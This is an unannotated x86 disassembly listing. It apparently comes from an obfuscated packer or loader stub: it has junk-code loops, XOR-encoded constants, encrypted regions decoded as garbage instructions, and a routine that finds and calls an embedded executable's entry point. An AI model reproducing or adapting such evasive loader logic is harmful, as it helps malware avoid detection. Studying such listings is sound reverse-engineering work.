  40d7e6:	add    DWORD PTR [ecx],ecx
  40d7e8:	loopne 0x40d825
  40d7ea:	dec    edi
  40d7eb:	rcl    ecx,1
  40d7ed:	out    dx,eax
  40d7ee:	daa    
  40d7ef:	stc    
  40d7f0:	jge    0x40d7a6
  40d7f2:	push   ecx
  40d7f3:	lods   eax,DWORD PTR ds:[esi]
  40d7f4:	test   al,0x8f
  40d7f6:	test   al,0x2a
  40d7f8:	pop    edi
  40d7f9:	(bad)  
  40d7fa:	cmp    DWORD PTR [edx],esi
  40d7fc:	call   ecx
  40d7fe:	inc    eax
  40d7ff:	add    eax,0xcaf0a1b
  40d804:	js     0x40d7fb
  40d806:	iret   
  40d807:	(bad)  
  40d808:	fistp  DWORD PTR [ecx]
  40d80a:	pop    ebp
  40d80b:	rcr    DWORD PTR [edx+0x5d2f5a7b],cl
  40d811:	stos   DWORD PTR es:[edi],eax
  40d812:	cmp    esp,DWORD PTR [eax-0xf]
  40d815:	psrlq  mm7,QWORD PTR [edx-0x51]
  40d819:	xor    al,0x4c
  40d81b:	imul   ecx,edi,0x42005c45
  40d821:	pop    esp
  40d822:	xor    bh,BYTE PTR [ebp-0x5d7eec63]
  40d828:	popa   
  40d829:	jns    0x40d7cf
  40d82b:	xor    edx,DWORD PTR [edx+0x6f3fa74c]
  40d831:	ins    DWORD PTR es:[edi],dx
  40d832:	lahf   
  40d833:	sti    
  40d834:	ds xchg ebp,eax
  40d836:	add    al,0xf6
  40d838:	push   ebx
  40d839:	xor    DWORD PTR [edi],esi
  40d83b:	jecxz  0x40d7c9
  40d83d:	add    al,0x5f
  40d83f:	std    
  40d840:	pop    esi
  40d841:	dec    ebx
  40d842:	aas    
  40d843:	jmp    0x78f9:0x1d3d6b53
  40d84a:	ins    DWORD PTR es:[edi],dx
  40d84b:	daa    
  40d84c:	push   eax
  40d84d:	jbe    0x40d810
  40d84f:	(bad)  
  40d850:	push   ebx
  40d851:	adc    bh,BYTE PTR [edi+ebp*4-0x236ca693]
  40d858:	shr    bh,1
  40d85a:	lock bound ecx,QWORD PTR ss:[ebp-0x62]
  40d85f:	call   0xac3bb702
  40d864:	pop    esi
  40d865:	int3   
  40d866:	jne    0x40d827
  40d868:	mov    al,ds:0x48f2b165
  40d86d:	add    DWORD PTR [ebx],0xffffff97
  40d870:	dec    ecx
  40d871:	and    BYTE PTR [ebx],al
  40d873:	jge    0x40d865
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x7a58d044]
  40e122:	sub    ah,BYTE PTR [eax]
  40e124:	push   0xc37070a6
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e179
  40e12d:	ficomp DWORD PTR [ebx+0x26]
  40e130:	pop    DWORD PTR [edx]
  40e132:	cs sub ebx,esp
  40e135:	sbb    DWORD PTR [ecx],edi
  40e137:	xor    eax,0xf3ae44ca
  40e13c:	ret    0xc0dd
  40e13f:	es jp  0x40e175
  40e142:	add    al,0xb
  40e144:	sub    ah,bh
  40e146:	push   ecx
  40e147:	dec    edx
  40e148:	inc    eax
  40e149:	sbb    dl,BYTE PTR [eax]
  40e14b:	(bad)  
  40e14c:	imul   edi,DWORD PTR [edi+eiz*4+0x1f22bfa3],0xdeb88645
  40e157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e158:	push   ebp
  40e159:	xchg   edx,eax
  40e15a:	mov    bh,0x3c
  40e15c:	sbb    eax,0x9a0a4238
  40e161:	loopne 0x40e1d9
  40e163:	jmp    0x57a4:0x205c521b
  40e16a:	shl    DWORD PTR [ebx],cl
  40e16c:	jg     0x40e1d3
  40e16e:	xor    DWORD PTR [eax],ebp
  40e170:	mov    al,ds:0x8d0f887
  40e175:	push   ebx
  40e176:	push   esp
  40e177:	push   ds
  40e178:	dec    edx
  40e179:	outs   dx,BYTE PTR ds:[esi]
  40e17a:	mov    ds:0x88c1a48f,al
  40e17f:	mov    ds:0xd7d1a9cf,al
  40e184:	xchg   ebp,eax
  40e185:	pop    esi
  40e186:	cmp    ebx,DWORD PTR [edi+0x884d727]
  40e18c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e18d:	push   ebx
  40e18e:	daa    
  40e18f:	shl    DWORD PTR [eax-0x7c],cl
  40e192:	jge    0x40e180
  40e194:	(bad)  
  40e195:	fcomi  st,st(6)
  40e197:	icebp  
  40e198:	cs xor ch,0x6d
  40e19c:	repz ss in eax,0xf
  40e1a0:	cmp    ah,0xe7
  40e1a3:	inc    ecx
  40e1a4:	pop    esp
  40e1a5:	int    0x43
  40e1a7:	vxorps xmm7,xmm5,XMMWORD PTR [ecx+0x38]
  40e1ac:	and    al,0x88
  40e1ae:	xchg   edx,eax
  40e1af:	fstp   st(6)
  40e1b1:	rol    BYTE PTR [edi+0x2585dacc],1
  40e1b7:	lods   eax,DWORD PTR gs:[esi]
  40e1b9:	inc    ebp
  40e1ba:	add    cl,BYTE PTR [edx-0x50921d8]
  40e1c0:	jmp    0x11f088
  40e1c5:	addr16 pop edx
  40e1c7:	icebp  
  40e1c8:	mov    dl,0x21
  40e1ca:	fwait
  40e1cb:	xor    ah,BYTE PTR [edi-0x1b]
  40e1ce:	pusha  
  40e1cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1d0:	jae    0x40e18f
  40e1d2:	inc    eax
  40e1d3:	rcl    BYTE PTR [esi],1
  40e1d5:	or     DWORD PTR [ebx-0x3246c265],esi
  40e1db:	retf   0xcc51
  40e1de:	jg     0x40e179
  40e1e0:	rcl    ecx,1
  40e1e2:	adc    al,0x5c
  40e1e4:	out    0x59,eax
  40e1e6:	cmp    DWORD PTR [ecx],esi
  40e1e8:	push   ds
  40e1e9:	out    dx,al
  40e1ea:	mov    eax,0x2427ea73
  40e1ef:	jmp    0xd6a9:0x3b91366f
  40e1f6:	dec    esi
  40e1f7:	sub    DWORD PTR [eax-0x3279469],ecx
  40e1fd:	sub    esp,esp
  40e1ff:	(bad)  
  40e200:	in     al,dx
  40e201:	in     al,0xbd
  40e203:	iret   
  40e204:	addr16 mov ecx,0xd8f27cd0
  40e20a:	and    ebp,DWORD PTR [edx+0x477e273a]
  40e210:	out    0x8,eax
  40e212:	pop    ss
  40e213:	or     DWORD PTR [edx],ecx
  40e215:	popa   
  40e216:	cmp    DWORD PTR [ebp+edi*1+0x7],edi
  40e21a:	xor    al,0xec
  40e21c:	sahf   
  40e21d:	imul   ebp,ebp,0x1dca2b84
  40e223:	mov    ds:0x7eb93e97,eax
  40e228:	mov    bl,0x5
  40e22a:	test   bh,al
  40e22c:	inc    ebx
  40e22d:	add    eax,0x97ab23fa
  40e232:	sahf   
  40e233:	mov    ds:0x435c439e,eax
  40e238:	mov    eax,ds:0xa383e68
